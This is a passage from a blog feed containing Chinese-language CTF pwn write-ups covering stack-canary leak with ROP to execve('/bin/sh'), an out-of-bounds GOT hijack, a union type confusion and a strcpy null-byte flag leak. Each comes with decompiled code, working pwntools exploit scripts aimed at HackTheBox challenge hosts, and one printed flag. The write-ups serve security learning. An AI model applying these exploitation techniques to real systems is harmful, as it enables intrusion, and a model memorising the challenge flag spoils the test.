class="number">0x401f9f</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x409fce</span>    </span><br><span class="line">syscall = <span class="number">0x401d54</span></span><br><span class="line">read2 = <span class="number">0x4018b4</span> </span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;?\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(canary) + p64(bss) + p64(read2))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(canary) + p64(bss)</span><br><span class="line"></span><br><span class="line">payload += flat([pop_rdi_ret, bss - <span class="number">0x20</span>,</span><br><span class="line">                 pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">                 pop_rax_ret, <span class="number">59</span>,</span><br><span class="line">                 syscall])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;先看一下這題的主邏輯：&lt;/p&gt;
&lt;div class=&quot;hi</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="migration" scheme="https://kazma.tw/tags/migration/"/>
    
  </entry>
  
  <entry>
    <title>Pwn CTF doors Writeup</title>
    <link href="https://kazma.tw/2024/11/11/Pwn-CTF-doors-Writeup/"/>
    <id>https://kazma.tw/2024/11/11/Pwn-CTF-doors-Writeup/</id>
    <published>2024-11-11T05:55:04.818Z</published>
    <updated>2024-11-11T11:56:13.533Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>首先我們看一下這題的保護機制：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec doors</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/doors&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></div><p>然後我們看到程式主邏輯很簡單：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> input_num; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There are many doors.\nChoose one and enter the correct password than you will got the treasure !!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The door number you  want to choose : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input_num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, (<span class="type">char</span> *)&amp;doors + <span class="number">8</span> * input_num);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Oh no,password is wrong,try again ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>以及一個後門：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">treasure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>所以觀察一下使用者可控的兩個輸入，我們可以發現第一個輸入可以讓第二個輸入任意寫，然後我們可以透過任意寫 puts 的 got 來達成 GOT-Hijacking 然後跳到 treasure 觸發 RCE。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./doors&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./doors&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">doors = elf.symbols[<span class="string">&#x27;doors&#x27;</span>]</span><br><span class="line">treasure = elf.symbols[<span class="string">&#x27;treasure&#x27;</span>]</span><br><span class="line"></span><br><span class="line">idx = (puts_got - doors) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(treasure))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;首先我們看一下這題的保護機制：&lt;/p&gt;
&lt;div class</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="oob-write" scheme="https://kazma.tw/tags/oob-write/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Entity Writeup</title>
    <link href="https://kazma.tw/2024/11/08/HackTheBox-Challenges-Entity-Writeup/"/>
    <id>https://kazma.tw/2024/11/08/HackTheBox-Challenges-Entity-Writeup/</id>
    <published>2024-11-07T17:25:58.479Z</published>
    <updated>2024-11-07T17:43:31.492Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題要考的是 Union 的類型混淆，DataStore 的宣告如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> integer;</span><br><span class="line">    <span class="type">char</span> <span class="built_in">string</span>[<span class="number">8</span>];</span><br><span class="line">&#125; DataStore;</span><br></pre></td></tr></table></figure></div><p>所以 integer 跟 string[8] 是存在同一個地方的，又程式的目標如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (DataStore.integer == <span class="number">13371337</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nSorry, this will not work!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>DataStore.integer 要是 13371337，但是設定的時候如果我們設定 13371337 他會因為下面的限制被結束掉：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_field</span><span class="params">(<span class="type">field_t</span> f)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMaybe try a ritual?\n\n&gt;&gt; &quot;</span>);</span><br><span class="line">    fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> (f) &#123;</span><br><span class="line">    <span class="keyword">case</span> INTEGER:</span><br><span class="line">        <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%llu&quot;</span>, &amp;DataStore.integer);</span><br><span class="line">        <span class="keyword">if</span> (DataStore.integer == <span class="number">13371337</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nWhat&#x27;s this nonsense?!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> STRING:</span><br><span class="line">        <span class="built_in">memcpy</span>(DataStore.<span class="built_in">string</span>, buf, <span class="keyword">sizeof</span>(DataStore.<span class="built_in">string</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>看到這裡我們先了解一件事情，如果我們希望 integer 被解釋成 13371337 那他實際存在記憶體的會是 0x0000000000CC7ACD，所以我們可以透過 p64(13371337) 把 byte 直接寫進去。<br>你們可能會搞混為什麼不是送 ‘13371337’ 進去，因為他會以 ascii 存在記憶體中，所以的差異在這。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;83.136.255.253&quot;</span>, <span class="number">40855</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;T&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;S&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, p64(<span class="number">13371337</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;C&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/pwn_entity.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這題要考的是 Union 的類型混淆，DataStore 的</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Vault-breaker Writeup</title>
    <link href="https://kazma.tw/2024/11/07/HackTheBox-Challenges-Vault-breaker-Writeup/"/>
    <id>https://kazma.tw/2024/11/07/HackTheBox-Challenges-Vault-breaker-Writeup/</id>
    <published>2024-11-06T16:39:57.584Z</published>
    <updated>2024-11-07T01:17:22.919Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題保護全開，然後程式主邏輯如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">new_key_gen</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> random_fd; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> random_fd2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 input_num; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  FILE *random_fp; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> key_buf[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  i = <span class="number">0LL</span>;</span><br><span class="line">  input_num = <span class="number">34LL</span>;</span><br><span class="line">  random_fp = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !random_fp )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;\n%sError opening /dev/urandom, exiting..\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">21</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( input_num &gt; <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*] Length of new password (0-%d): &quot;</span>, <span class="number">31LL</span>);</span><br><span class="line">    input_num = read_num();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(key_buf, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  random_fd = fileno(random_fp);</span><br><span class="line">  read(random_fd, key_buf, input_num);</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; input_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( !key_buf[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      random_fd2 = fileno(random_fp);</span><br><span class="line">      read(random_fd2, &amp;key_buf[i], <span class="number">1uLL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(random_key, key_buf);</span><br><span class="line">  fclose(random_fp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n%s[+] New key has been genereated successfully!\n%s&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>, <span class="string">&quot;\x1B[1;34m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>這邊的問題就是他會讓我們生成隨機長度的密鑰，但是他用 <code>strcpy</code> 而不是 <code>memcpy</code>，這導致他會把 null byte 也複製過去，所以我們就可以透過不同長度的密鑰來控制 null byte 的位置，而他做的就只是把 random key 跟 flag 做 xor 而剛好 xor 0 不會變。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>這邊提供兩種解法：</p><ol><li>第一種是假設我們密鑰等於 0 所以 random key 第一位就會等於 null byte，這時我們就可以看到 flag 的第一位，以此類推，我們從 0 到 31 就可以得到整個 flag：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;HTB&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>] != <span class="string">b&quot;&#125;&quot;</span>:</span><br><span class="line">    r = remote(<span class="string">&quot;94.237.52.225&quot;</span>, <span class="number">39459</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(flag)))</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Vault: &quot;</span>)</span><br><span class="line">    r.recv(<span class="built_in">len</span>(flag))</span><br><span class="line">    flag += r.recv(<span class="number">1</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>執行結果：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">└─$ python vault.py</span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4n&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_k&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_ku&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kud&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudu&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;\n&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;\n\n&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;\n\n\n&#x27;</span></span><br></pre></td></tr></table></figure></div>因為他 flag 有加換行所以沒有正常終止，可以改成 endswith 之類的。</li><li>第二種是我們從 31 設定回來，這樣 random key 就都會是 null byte：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.52.225&quot;</span>, <span class="number">39459</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i=&#125;</span>&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Vault: &quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>執行結果：<div class="highlight-container" 